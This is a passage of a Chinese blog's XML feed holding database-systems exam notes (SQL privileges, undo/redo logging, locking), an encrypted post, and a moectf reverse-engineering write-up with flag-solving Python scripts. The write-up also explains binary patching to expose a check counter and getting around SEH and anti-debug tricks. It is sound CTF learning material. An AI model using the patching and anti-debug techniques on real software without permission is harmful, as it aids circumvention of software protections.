id="用户授权"><a href="#用户授权" class="headerlink" title="用户授权"></a>用户授权</h3><p>SQL 识别更详细的权限集，在关系上，一共 9 种：</p><ol><li><code>SELECT [on relation | attributes list]</code> 查询的权限</li><li><code>INSERT [on relation | attributes list]</code> 插入元组的权限</li><li><code>DELETE</code> 删除元组的权限</li><li><code>UPDATE [on relation | attributes list]</code> 更新元组的权限</li><li><code>REFERENCE [on relation | attributes list]</code> 被约束引用的权限</li><li><code>USAGE [模式元素 除了关系和断言]</code> 在自己的声明中使用这个元素的权限</li><li><code>TRIGGER [on relation]</code> 在关系上定义触发器的权限</li><li><code>EXECUTE</code> 执行代码的权限，例如 PSM 存储过程或函数</li><li><code>UNDER</code> 在给定类型创建子类型的权限</li></ol><p>授予权限：GRANT &lt;权限列表&gt;<br>ON &lt;关系名或视图名&gt;<br>TO &lt;用户或角色列表&gt;;</p><p>在默认方式下，被授予权限的用户&#x2F;角色无权把得到的权限再授予给另外的用户&#x2F;角色。</p><p>GRANT &lt;权限列表&gt;<br>ON &lt;关系名或视图名&gt;<br>TO &lt;用户或角色列表&gt;<br>WITH GRANT&#x2F;ADMIN OPTION;</p><p>加上 <code>WITH GRANT OPTION</code>，表示被授权的用户可以<strong>把这个权限再授权给其他人</strong>。</p><p>收回权限：REVOKE &lt;权限列表&gt;<br>ON &lt;关系名或视图名&gt;<br>FROM &lt;用户或角色列表&gt;;</p><p>假如超级管理员U1授权给U2，U2又授权给U3，U3又授权给了U4，当U1要收回U2的授权时，U3和U4的授权也被收回。这种从一个用户&#x2F;角色收回权限可能导致其他用户&#x2F;角色也失去该权限，这一行为称作级联收回。</p><p>对于使用with admin option授予权限的用户，系统收回其权限时，不会级联收回。</p><ul><li><code>CASCADE</code>：收回权限时也要收回那些仅仅由于要收回权限而被授予的权限</li><li><code>RESTRICT</code>：如果权限被传递给其他人，收权语句不执行</li></ul><p>授权图</p><p>AP表示授权ID A有权限P,AP*表示有授权选项，AP**表示A是权限P的属主</p><p>当 A 授权 P 给 B，则在 AP* 或 AP** 到 BP 间画一条边（如果有授权选项，则是 BP*）</p><p>基本规则：用户 C 有权限 Q，只要从 XP** 到 CQ&#x2F;CQ*&#x2F;CQ** 有边，且 P 是 Q 的父权限。（P 可能是 Q，X 可能是 C）</p><p>A 级联收回 B 的 P 权限，则删除从 AP 到 BP 的边。</p><p>A RESTRICT 收回 B 的 P 权限，且 BP 有出发的边，则拒绝收权，无事发生。</p><h2 id="数据库恢复"><a href="#数据库恢复" class="headerlink" title="数据库恢复"></a>数据库恢复</h2><h3 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h3><p>显式定义：</p><ul><li><code>BEGIN TRANSACTION 语句 COMMIT</code>：提交，事务正常结束</li><li><code>BEGIN TRANSACTION 语句 ROLLBACK</code>：回滚到事务开始时状态，事务非正常结束</li></ul><p>隐式定义：</p><ul><li>每一个查询或更新语句都是一个事务</li></ul><p>提交 COMMIT：</p><ul><li>事务完成</li><li>数据库更新将永久保存</li></ul><p>回滚 ROLLBACK：</p><ul><li>事务 abort</li><li>对数据库没有影响</li><li>举例：除以 0、违反约束</li></ul><p>原语操作：</p><p>x 是数据库元素</p><ul><li>INPUT(x)：将包含 x 的磁盘块拷贝到内存缓冲区</li><li>OUTPUT(x)：将包含 x 的缓冲区拷贝回磁盘</li><li>READ(x,t)：将内存缓冲区的 x 拷贝到事务的局部变量 t</li><li>WRITE(x,t)：将局部变量 t 的值拷贝到内存缓冲区的 x</li></ul><h3 id="undo-logging"><a href="#undo-logging" class="headerlink" title="undo logging"></a>undo logging</h3><p>保证事务原子性（整体被执行&#x2F;不执行）的一种方法</p><p>在系统故障之前，通过撤销可能未完成的事务的影响来修复数据库状态</p><p>仅更新记录&lt;T,X,v&gt;</p><p>事务T更改了数据库元素X，更改前的值为v</p><p>更新记录所反映的改变通常发生在主存中而不是磁盘上，即日志记录是对 WRITE 做出的反应，而不是对 OUTPUT 做出的反应</p><p>undo-logging rules:</p><ul><li>U1：如果事务 T 改变了数据库元素 X，那么形如 &lt;T, X, *v*&gt; 的日志记录必须在 X 的新值写到磁盘前写到磁盘</li><li>U2：如果事务提交，则其 COMMIT 日志记录必须在事务改变的所有数据库元素已写到磁盘后再写到磁盘，但应尽快</li></ul><p>必须按照以下顺序写入磁盘：</p><p>1.显示数据库元素发生变化的日志记录</p><p>2.变更后的元素本身</p><p>3.提交日志记录</p><p>为了强制将日志记录写到磁盘，日志记录需要一条刷新日志命令，告诉缓冲区管理器：将以前没有拷贝到磁盘的日志记录、从上一次拷贝以来已发生修改的日志记录拷贝到磁盘，FLUSH LOG</p><p>事务管理器需要告诉缓冲区管理器：在某个数据库元素上执行 OUTPUT 动作</p><h3 id="redo-logging"><a href="#redo-logging" class="headerlink" title="redo logging"></a>redo logging</h3><p>在事务修改数据后，将新值写入日志</p><p>延迟修改：数据修改后暂存内存，提交后批量写入磁盘</p><p>写入磁盘顺序：日志-&gt;COMMIT-&gt;数据</p><p>undo&#x2F;redo:同时记录旧值和新值</p><p>数据库恢复机制</p><p>undo&#x2F;redo模型</p><table><thead><tr><th>类型</th><th>含义</th></tr></thead><tbody><tr><td><strong>Redo 所有已提交事务（COMMIT）</strong></td><td>即使数据页已在内存或磁盘中，也要重做已提交事务的操作，确保持久性。</td></tr><tr><td><strong>Undo 所有未提交事务</strong></td><td>撤销所有未提交事务对数据库的修改（从日志中恢复“旧值”）</td></tr></tbody></table><p>恢复操作：日志回放，倒序扫描</p><p>追加日志：&lt;UNDO T1, B, 21, 20&gt;<br>&lt;UNDO T1, D, 41, 40&gt;<br><ABORT t1></ABORT></p><h2 id="并发控制"><a href="#并发控制" class="headerlink" title="并发控制"></a>并发控制</h2><p><img src="/2025/06/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F/image-20250604191924848.png" alt="image-20250604191924848"></p><p>两个操作属于冲突操作，必须满足：</p><ol><li>它们作用于<strong>同一数据项</strong>；</li><li>它们<strong>至少一个是写操作</strong>；</li><li>它们属于<strong>不同的事务</strong></li></ol><table><thead><tr><th>概念</th><th>一句话定义</th><th>区别</th></tr></thead><tbody><tr><td><strong>可串行化</strong></td><td>一个调度如果<strong>等价于某个串行执行的调度</strong>，就是可串行化。</td><td>强调效果一样</td></tr><tr><td><strong>冲突可串行化</strong></td><td>如果一个调度<strong>通过交换不冲突的操作可以变成某个串行调度</strong>，就是冲突可串行化。</td><td>强调操作顺序一样</td></tr></tbody></table><p>冲突可串行化是可串行化的子集</p><p>优先关系图</p><p>检查一个调度是不是冲突可串行化的。</p><p>结点：调度的事务，标下标</p><p>边：Ti → Tj，指 Ti 优先于 Tj，写做 Ti &lt; sTj，满足：</p><ul><li>Ti 的动作 A1、Tj 的动作 A2</li><li>调度 S 中 A1 在 A2 之前</li><li>A1 和 A2 涉及同一数据库元素，且二者中至少一个是写</li></ul><p>构建优先图，判断是否有环</p><p>二阶段锁协议要求：一个事务加锁和释放锁分为两个阶段，加完锁之后就不能再加锁，只能释放。</p><p>为什么二阶段锁有效？</p><p><strong>如果只有加锁阶段（没解锁）</strong> ⇒ 死锁、资源不释放；</p><p><strong>如果加锁和解锁随意交错</strong> ⇒ 事务可以“插队”改变本应串行的顺序 ⇒ 出现并发异常（脏读、不可重复读等）；</p><p>所以二阶段锁是实现串行化的<strong>恰好最小限制条件</strong>。</p><p>锁</p><p>共享锁（shared-lock):允许多个事务并发读取数据，不能修改数据</p><p>排他锁（exclusive lock):事务可以读写数据</p><p>更新锁（update lock):为了防止死锁设计，用于“读后写”的场景：先加更新锁，准备更新数据，等确认写时再升级为排他锁。</p><p>一个资源只能有一个更新锁，但与共享锁兼容。</p>]]></content>
      
      
      <categories>
          
          <category> 复习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCC2025</title>
      <link href="/2025/05/09/ISCC2025/"/>
      <url>/2025/05/09/ISCC2025/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="4fa7d3d5c881124fcc6402f15df9f678635d7ac584bdc0ef853a4c07b2bc4ab1"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强壮逆向人!</title>
      <link href="/2025/05/09/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA/"/>
      <url>/2025/05/09/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA/</url>
      
        <content type="html"><![CDATA[<p>好好学逆向</p><p>moectf题真的好，每日一题</p><p>2025.6.19   考完试一定写🥲</p><p>2025.7.19 会写的会写的😫</p><h2 id="A-game"><a href="#A-game" class="headerlink" title="A_game"></a>A_game</h2><p><img src="/2025/05/09/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA/1.png" alt="1"></p><p>好清晰的逻辑，好清晰的函数名🥲 首先输入49个字符的字符串，将这49个字符填入9x9的box数组中值为0的位置，经过3个check函数验证是否正确，如果正确，那么将str与magic数组异或得到flag</p><p>接下来我们查看check1函数的代码</p><p><img src="/2025/05/09/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA/2.png" alt="2"></p><p>每一行必须包含数字 1～9，不能重复，也不能缺少</p><p>check2函数：每一列必须包含数字 1～9，不能重复，也不能缺少</p><p>check3函数：每一个 3x3 小宫格中都包含 1~9 各一次</p><p>很明显，这是数独游戏的规则，我们需要填入正确的49个数字</p><p>直接用python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span></span><br><span class="line"></span><br><span class="line">box=[<span class="number">0</span>,   <span class="number">0</span>,   <span class="number">5</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">4</span>,   <span class="number">3</span>,   <span class="number">6</span>,   <span class="number">0</span>,</span><br><span class="line">     <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">5</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">2</span>,   <span class="number">4</span>,</span><br><span class="line">     <span class="number">0</span>,   <span class="number">4</span>,   <span class="number">9</span>,   <span class="number">6</span>,   <span class="number">7</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,</span><br><span class="line">     <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">6</span>,   <span class="number">0</span>,   <span class="number">2</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">3</span>,   <span class="number">0</span>,</span><br><span class="line">     <span class="number">9</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">7</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">8</span>,</span><br><span class="line">     <span class="number">0</span>,   <span class="number">3</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">5</span>,   <span class="number">0</span>,   <span class="number">9</span>,   <span class="number">0</span>,</span><br><span class="line">     <span class="number">2</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">5</span>,   <span class="number">0</span>,   <span class="number">7</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">9</span>,</span><br><span class="line">     <span class="number">7</span>,   <span class="number">0</span>,   <span class="number">4</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">8</span>,   <span class="number">0</span>,   <span class="number">0</span>,</span><br><span class="line">     <span class="number">0</span>,   <span class="number">9</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">4</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把box转换为二维列表</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">to_grid</span>(<span class="params">flat: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">    <span class="keyword">return</span> [flat[i*<span class="number">9</span>:(i+<span class="number">1</span>)*<span class="number">9</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数独求解器</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid</span>(<span class="params">grid, row, col, num</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">if</span> grid[row][i] == num <span class="keyword">or</span> grid[i][col] == num:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    start_row, start_col = <span class="number">3</span>*(row//<span class="number">3</span>), <span class="number">3</span>*(col//<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            <span class="keyword">if</span> grid[start_row+i][start_col+j] == num:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">grid</span>):</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">            <span class="keyword">if</span> grid[row][col] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">                    <span class="keyword">if</span> is_valid(grid, row, col, num):</span><br><span class="line">                        grid[row][col] = num</span><br><span class="line">                        <span class="keyword">if</span> solve(grid):</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                        grid[row][col] = <span class="number">0</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 记录原始空位</span></span><br><span class="line">empty_indices = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">81</span>) <span class="keyword">if</span> box[i] == <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解题并构造 Str</span></span><br><span class="line">grid = to_grid(box.copy())</span><br><span class="line"><span class="keyword">if</span> solve(grid):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Sudoku Solved:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> grid:</span><br><span class="line">        <span class="built_in">print</span>(row)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 拼接填入空位的字符，作为 Str</span></span><br><span class="line">    Str = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(grid[i//<span class="number">9</span>][i%<span class="number">9</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> empty_indices)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[+] Final Str (49 input chars):\n<span class="subst">&#123;Str&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] No solution found.&quot;</span>)</span><br><span class="line"></span><br><span class="line">magic=[<span class="number">107</span>,   <span class="number">2</span>, <span class="number">102</span>, <span class="number">112</span>,  <span class="number">68</span>, <span class="number">105</span>, <span class="number">126</span>, <span class="number">110</span>,  <span class="number">67</span>,  <span class="number">74</span>,</span><br><span class="line"><span class="number">120</span>,  <span class="number">74</span>, <span class="number">109</span>,  <span class="number">96</span>,  <span class="number">86</span>,   <span class="number">0</span>,  <span class="number">81</span>,  <span class="number">89</span>,  <span class="number">80</span>,  <span class="number">67</span>,</span><br><span class="line"><span class="number">80</span>,  <span class="number">81</span>, <span class="number">109</span>, <span class="number">116</span>,   <span class="number">2</span>,  <span class="number">85</span>,  <span class="number">80</span>,  <span class="number">82</span>, <span class="number">110</span>, <span class="number">111</span>,</span><br><span class="line"><span class="number">121</span>,  <span class="number">64</span>,  <span class="number">93</span>,  <span class="number">75</span>,  <span class="number">30</span>,  <span class="number">25</span>,  <span class="number">28</span>, <span class="number">116</span>,   <span class="number">3</span>,  <span class="number">84</span>,</span><br><span class="line"><span class="number">7</span>,  <span class="number">76</span>,  <span class="number">82</span>, <span class="number">106</span>,  <span class="number">96</span>,  <span class="number">80</span>,  <span class="number">88</span>,  <span class="number">64</span>,  <span class="number">88</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">ord</span>(Str[i]) ^ magic[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">49</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;\n[+] Flag: moectf&#123;&#123;<span class="subst">&#123;flag&#125;</span>&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="Android-Cracker"><a href="#Android-Cracker" class="headerlink" title="Android_Cracker"></a>Android_Cracker</h2><p>用jadx打开找到MainActivity打开就是了</p><h2 id="Broken-hash"><a href="#Broken-hash" class="headerlink" title="Broken_hash"></a>Broken_hash</h2><p>没做出来，复现一下</p><p>有一个师傅的解法很简单：</p><p>这个程序需要输入88位字符，经过变种SHA1算法转化，再和一个数组比较</p><p>先输入88个a，下断点动调</p><p>看到了加密后的数组,发现<code>a</code>变成<code>0x0D7C1A410</code></p><p><img src="/2025/05/09/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA/3.png" alt="3"></p><p>所以可以输入abcdefghijklmnopqrstuvwxyz1234567890_!ABCDEFGHIJKLMNOPQRSTUVWXYZ{}aaaaaaaaaaaaaaaaaaaaaa</p><p>建立一个映射表</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">0x64744C9A</span>, <span class="number">0x047C2FF1</span>, <span class="number">0xA2D74292</span>, <span class="number">0x85BEF77E</span>, <span class="number">0x711FCBF7</span>, <span class="number">0x669E1609</span>, <span class="number">0x6BBD9DB6</span>, <span class="number">0x6941C8A4</span>, <span class="number">0xB16E48B3</span>, <span class="number">0xDE321186</span>, <span class="number">0x5251E8C2</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x711FCBF7</span>, <span class="number">0xCB5C3FAD</span>, <span class="number">0x36568AF5</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x82ACF96A</span>, <span class="number">0x75DCD570</span>, <span class="number">0x7EF00E40</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x4BE9314A</span>, <span class="number">0xCB5C3FAD</span>, <span class="number">0xA2D74292</span>, <span class="number">0xDE321186</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x46927FA8</span>, <span class="number">0xB16E48B3</span>, <span class="number">0xD7C1A410</span>, <span class="number">0x567375C3</span>, <span class="number">0x711FCBF7</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x9C19F0F3</span>, <span class="number">0xD035E914</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x6941C8A4</span>, <span class="number">0x0B7D1395</span>, <span class="number">0xD7C1A410</span>, <span class="number">0xC87A7C7E</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0xD7C1A410</span>, <span class="number">0xDE321186</span>, <span class="number">0x5251E8C2</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0xD5380C52</span>, <span class="number">0xBEA99D3B</span>, <span class="number">0xCEDB7952</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x73456320</span>,</span><br><span class="line">     <span class="number">0xD7C1A410</span>, <span class="number">0xDE321186</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x581D99E5</span>, <span class="number">0xA2D74292</span>, <span class="number">0x711FCBF7</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x06372812</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x73456320</span>, <span class="number">0xCEDB7952</span>, <span class="number">0xEF53E254</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x9F12424D</span>, <span class="number">0x669E1609</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x9C19F0F3</span>, <span class="number">0xFECF7685</span>, <span class="number">0x0B7D1395</span>, <span class="number">0x1833E8B1</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x9F66DD04</span>, <span class="number">0xA2D74292</span>, <span class="number">0xD7C1A410</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0x6941C8A4</span>, <span class="number">0x866CAF4F</span>, <span class="number">0x047C2FF1</span>, <span class="number">0x64744C9A</span>, <span class="number">0xFB8F95A7</span>, <span class="number">0xD5380C52</span>, <span class="number">0xCEDB7952</span>, <span class="number">0xDE321186</span>, <span class="number">0x81453D43</span>, <span class="number">0xCB5C3FAD</span>, <span class="number">0xB16E48B3</span>, <span class="number">0xC578F843</span>, <span class="number">0xCEDB7952</span>, <span class="number">0xDE321186</span>, <span class="number">0xE38C6F07</span>, <span class="number">0x8B9E97A8</span>, <span class="number">0x8FDF9EDF</span>, <span class="number">0xD1868B96</span>, <span class="number">0x93AFD1D1</span>, <span class="number">0x8D8BDF85</span>, <span class="number">0x989EDF86</span>, <span class="number">0xDF91969E</span>, <span class="number">0xF5C3A0C1</span>, <span class="number">0x00000000</span>][:<span class="number">88</span>]</span><br><span class="line">b = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz1234567890_!ABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;aaaaaaaaaaaaaaaaaaaaaa&quot;</span></span><br><span class="line">c = [<span class="number">0x0D7C1A410</span>, <span class="number">0x9E3919E7</span>, <span class="number">0x85BEF77E</span>, <span class="number">0x5251E8C2</span>, <span class="number">0x0A2D74292</span>, <span class="number">0x669E1609</span>, <span class="number">0x5C1DFF11</span>, <span class="number">0x0CB5C3FAD</span>, <span class="number">0x0FECF7685</span>, <span class="number">0x0B0F33A9A</span>, <span class="number">0x1833E8B1</span>, <span class="number">0x0B7D1395</span>, <span class="number">0x64744C9A</span>, <span class="number">0x0DE321186</span>, <span class="number">0x47C2FF1</span>, <span class="number">0x0EF53E254</span>, <span class="number">0x1902B329</span>, <span class="number">0x866CAF4F</span>, <span class="number">0x4A528AE0</span>, <span class="number">0x711FCBF7</span>, <span class="number">0x0CEDB7952</span>, <span class="number">0x352B172C</span>, <span class="number">0x0AFEA7FF6</span>, <span class="number">0x3175EDAB</span>, <span class="number">0x0D035E914</span>, <span class="number">0x20D324AE</span>, <span class="number">0x0B16E48B3</span>, <span class="number">0x5C6054F</span>, <span class="number">0x36568AF5</span>, <span class="number">0x0BEA2375F</span>, <span class="number">0x567375C3</span>, <span class="number">0x0BF0FD0CB</span>, <span class="number">0x4BE9314A</span>, <span class="number">0x7F2A2EBE</span>, <span class="number">0x0C87A7C7E</span>, <span class="number">0x0BEA99D3B</span>, <span class="number">0x0FB8F95A7</span>, <span class="number">0x94D2FB03</span>, <span class="number">0x6372812</span>, <span class="number">0x46927FA8</span>, <span class="number">0x73456320</span>, <span class="number">0x4E3F843</span>, <span class="number">0x75DCD570</span>, <span class="number">0x6941C8A4</span>,</span><br><span class="line">     <span class="number">0x581D99E5</span>, <span class="number">0x7EF00E40</span>, <span class="number">0x7A260E4D</span>, <span class="number">0x0C578F843</span>, <span class="number">0x17947C53</span>, <span class="number">0x786C70</span>, <span class="number">0x9C19F0F3</span>, <span class="number">0x1D795AC9</span>, <span class="number">0x9F12424D</span>, <span class="number">0x0AB021E08</span>, <span class="number">0x77ACB10</span>, <span class="number">0x0D1D0F68E</span>, <span class="number">0x82ACF96A</span>, <span class="number">0x9F66DD04</span>, <span class="number">0x8AD9BAF7</span>, <span class="number">0x0AAE6D8C9</span>, <span class="number">0x0E73CAEF</span>, <span class="number">0x0BFC92893</span>, <span class="number">0x0D5380C52</span>, <span class="number">0x81453D43</span>, <span class="number">0x6BBD9DB6</span>, <span class="number">0x0E38C6F07</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>, <span class="number">0x0D7C1A410</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="built_in">print</span>(b[c.index(i)], end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>官方wp：考察SEH，patch程序，以及编写交互脚本</p><p>本题使用了一个哈希算法（SHA1，魔改了部分参数）对flag每一位计算哈希，然后跟密文对比验证。当然，只取了最终哈希值的前4个字节（防止直接用SHA1去查彩虹表）。 预期解法是去patch程序输出，让程序能够输出check过的长度（即for循环中的i）。具体而言，这个循环是每次验证一位，不正确就退出循环，所以当我们的输入只有前3个字符正确的时候，i退出时应该是3；前4个字符正确的时候，i退出时应该是4。我们想办法让程序输出这个i，然后每一位去尝试每一个可见字符。i每自增一次，我们就知道当前这一位字符是正确的。当然了，这道题使用异常处理隐藏了真正的输出，真正的输出字符附在密文的最后，进行了一个异或0xff的解密之后才输出。，且加了反调试，如果是在调试状态下，不会进入异常，会进入假的print。</p><p>SEH异常处理机制</p><p><img src="/2025/05/09/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA/4.png" alt="4"></p><p>找到了异常处理函数,这个函数作用是打印flag，patch一下</p><p><img src="/2025/05/09/%E5%BC%BA%E5%A3%AE%E9%80%86%E5%90%91%E4%BA%BA/5.png" alt="5"></p><p>还没成功，再研究一下</p>]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web签个到</title>
      <link href="/2025/03/27/web%E7%AD%BE%E4%B8%AA%E5%88%B0/"/>
      <url>/2025/03/27/web%E7%AD%BE%E4%B8%AA%E5%88%B0/</url>
      
